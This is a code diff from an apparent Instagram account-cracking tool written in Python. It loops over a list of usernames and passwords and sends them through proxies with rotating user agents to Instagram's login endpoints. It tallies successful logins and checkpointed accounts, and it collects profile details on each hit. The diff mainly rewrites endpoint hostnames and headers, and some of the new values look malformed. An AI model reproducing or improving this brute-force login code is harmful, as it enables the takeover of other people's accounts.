@@ -1015,9 +1015,9 @@ class instagram:
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
-                token=s.get('https://z-p42-instagram.c10r.instagram.com/api/v1/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fpassword%2Fchange%2F%3F__coig_login%3D1/')
+                token=s.get('https://z-p42.www.instagram.c10r.instagram.com/api/v1/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fpassword%2Fchange%2F%3F__coig_login%3D1/')
                 headers = {
-                    'Host':'https://z-p42-instagram.c10r.instagram.com/',
+                    'Host':'https://z-p42.www.instagram.com/',
                     'connection':'keep-alive',
                     'sec-ch-ua':'"Chromium";v="105", "Not)A;Brand";v="8"',
                     'x-ig-app-id':'1217981644879628',
@@ -1031,11 +1031,11 @@ class instagram:
                     'user-agent': uaku,
                     'x-csrftoken':token.cookies['csrftoken'],
                     'sec-ch-ua-platform': '"Windows"',
-                    'origin':'https://z-p42-instagram.c10r.instagram.com',
+                    'origin':'www.instagram.com',
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
-                    'referer':'https://z-p42-instagram.c10r.instagram.com/api/v1/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fpassword%2Fchange%2F%3F__coig_login%3D1/',
+                    'referer':'https://z-p42.www.instagram.c10r.instagram.com/api/v1/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fpassword%2Fchange%2F%3F__coig_login%3D1/',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                 param={
                     "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
@@ -1044,7 +1044,7 @@ class instagram:
                     "optIntoOneTap": 'false',
                     "stopDeletionNonce": "",
                     "trustedDeviceRecords": "{}"}
-                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
+                x=s.post("https://z-p42.www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                 x_jason=json.loads(x.text)
                 if "userId" in str(x_jason):
                     nama,pengikut,mengikut,postingan=self.APIinfo(user)
@@ -1082,10 +1082,10 @@ class instagram:
         global loop,success,checkpoint
         sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
         try:
-            token=s.get("https://z-p42-instagram.c10r.instagram.com/",headers={"user-agent":User_Agent()}).content
+            token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
             crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
             s.headers.update({
-                'authority': 'https://z-p42-instagram.c10r.instagram.com/',
+                'authority': 'https://z-p42.www.instagram.com',
                 'x-ig-www-claim': 'hmac.AR0Ft-pZRNZTzI7hjqy0oNQ3tHwi9IV_Q92-GUDay5ra5_FT',
                 'x-instagram-ajax': '91a4c055cfdf',
                 'sec-ch-ua-platform': '"Windows"',
@@ -1111,7 +1111,7 @@ class instagram:
                 "stopDeletionNonce": "",
                 "trustedDeviceRecords": {}
             }
-            x=s.post("https://z-p42-instagram.c10r.instagram.com/login/ajax/",data=param);sleep(1)
+            x=s.post("https://z-p42.www.instagram.com/login/ajax/",data=param);sleep(1)
             x_jason=json.loads(x.text)
             if "userId" in x.text:
                 nama,pengikut,mengikut,postingan=self.APIinfo(user)
